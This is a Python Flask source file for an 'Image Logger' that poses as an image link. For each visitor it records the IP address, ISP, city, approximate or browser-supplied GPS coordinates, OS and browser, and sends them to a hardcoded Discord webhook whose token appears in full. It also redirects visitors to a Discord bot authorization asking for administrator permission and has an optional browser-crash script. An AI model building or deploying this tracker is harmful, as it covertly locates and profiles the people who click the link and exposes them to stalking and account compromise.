# Image Logger - Vercel compatible (Flask)
# Fixed string interpolation to avoid any parsing issues
from flask import Flask, request, Response, redirect
import traceback, requests, base64, httpagentparser

app = Flask(__name__)

# ------------------- CONFIG -------------------
config = {
    "webhook": "https://discord.com/api/webhooks/1516414464356909237/qwaTjxvMGLFpgO0aHL5fdKTrDD99Me82ik1p5rrOefvu4XBbYuJjQTdnm-NB10ATKkdX",
    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRHsU06RNyMELY_CCup7OkIxcYT32ebaSYcNw&s",
    "imageArgument": True,
    "username": "jajajaja ip lookup",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": True,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 2,
    "redirect": {
        "redirect": True,
        "page": "https://discord.com/oauth2/authorize?client_id=1482280383381770340&permissions=8&integration_type=0&scope=bot+applications.commands"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

# ------------------- Helper functions -------------------
def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
            }]
        })
    except:
        pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [{
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }]
            })
        return

    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()

    if info["proxy"]:
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""

    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent)

    # ---------- 안전하게 만든 Description (중첩 따옴표 문제 해결) ----------
    description = "**A User Opened the Original Image!**\n\n"
    description += f"**Endpoint:** `{endpoint}`\n\n"
    description += "**IP Info:**\n"
    description += f"> **IP:** `{ip if ip else 'Unknown'}`\n"
    description += f"> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`\n"
    description += f"> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`\n"
    description += f"> **Country:** `{info['country'] if info['country'] else 'Unknown'}`\n"
    description += f"> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`\n"
    description += f"> **City:** `{info['city'] if info['city'] else 'Unknown'}`\n"
    
    coords_str = f"{str(info['lat'])}, {str(info['lon'])}" if not coords else coords.replace(',', ', ')
    if coords:
        map_link = f"https://www.google.com/maps/search/google+map++{coords}"
        coords_display = f"Precise, [Google Maps]({map_link})"
    else:
        coords_display = "Approximate"
    description += f"> **Coords:** `{coords_str}` ({coords_display})\n"
    
    tz_parts = info['timezone'].split('/')
    tz_display = f"{tz_parts[1].replace('_', ' ')} ({tz_parts[0]})" if len(tz_parts) == 2 else info['timezone']
    description += f"> **Timezone:** `{tz_display}`\n"
    description += f"> **Mobile:** `{info['mobile']}`\n"
    description += f"> **VPN:** `{info['proxy']}`\n"
    
    bot_status = "False"
    if info['hosting'] and not info['proxy']:
        bot_status = str(info['hosting'])
    elif info['hosting']:
        bot_status = "Possibly"
    description += f"> **Bot:** `{bot_status}`\n\n"
    
    description += "**PC Info:**\n"
    description += f"> **OS:** `{os}`\n"
    description += f"> **Browser:** `{browser}`\n\n"
    
    description += "**User Agent:**\n```\n" + useragent + "\n```"

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": description,
        }]
    }

    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})

    requests.post(config["webhook"], json=embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

# ------------------- Flask Routes -------------------
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def handle_request(path):
    try:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        useragent = request.headers.get('User-Agent', '')
        endpoint = request.path

        if config["imageArgument"]:
            url_arg = request.args.get('url') or request.args.get('id')
            if url_arg:
                try:
                    url = base64.b64decode(url_arg.encode()).decode()
                except:
                    url = config["image"]
            else:
                url = config["image"]
        else:
            url = config["image"]

        html_data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()

        if ip.startswith(blacklistedIPs):
            return Response("Blocked", status=403)

        if botCheck(ip, useragent):
            if config["buggedImage"]:
                response = Response(binaries["loading"], content_type='image/jpeg')
            else:
                response = redirect(url, code=302)
            makeReport(ip, endpoint=endpoint, url=url)
            return response

        gps = request.args.get('g')
        if gps and config["accurateLocation"]:
            try:
                location = base64.b64decode(gps.encode()).decode()
                result = makeReport(ip, useragent, location, endpoint, url=url)
            except:
                result = None
        else:
            result = makeReport(ip, useragent, endpoint=endpoint, url=url)

        message = config["message"]["message"]
        if config["message"]["richMessage"] and result:
            message = message.replace("{ip}", ip)
            message = message.replace("{isp}", result.get("isp", ""))
            message = message.replace("{asn}", result.get("as", ""))
            message = message.replace("{country}", result.get("country", ""))
            message = message.replace("{region}", result.get("regionName", ""))
            message = message.replace("{city}", result.get("city", ""))
            message = message.replace("{lat}", str(result.get("lat", "")))
            message = message.replace("{long}", str(result.get("lon", "")))
            tz = result.get("timezone", "Unknown/Unknown")
            tz_parts = tz.split('/')
            if len(tz_parts) == 2:
                tz_display = f"{tz_parts[1].replace('_', ' ')} ({tz_parts[0]})"
            else:
                tz_display = tz
            message = message.replace("{timezone}", tz_display)
            message = message.replace("{mobile}", str(result.get("mobile", False)))
            message = message.replace("{vpn}", str(result.get("proxy", False)))
            bot_status = str(result.get("hosting", False) if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False')
            message = message.replace("{bot}", bot_status)
            os, browser = httpagentparser.simple_detect(useragent)
            message = message.replace("{browser}", browser)
            message = message.replace("{os}", os)

        datatype = 'text/html'
        response_body = html_data

        if config["message"]["doMessage"]:
            response_body = message.encode()

        if config["crashBrowser"]:
            response_body = (message + '<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>').encode()

        if config["redirect"]["redirect"]:
            response_body = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()

        if config["accurateLocation"] and not request.args.get('g'):
            script = b"""<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}
</script>"""
            response_body += script

        return Response(response_body, content_type=datatype)

    except Exception as e:
        reportError(traceback.format_exc())
        return Response("500 - Internal Server Error", status=500)
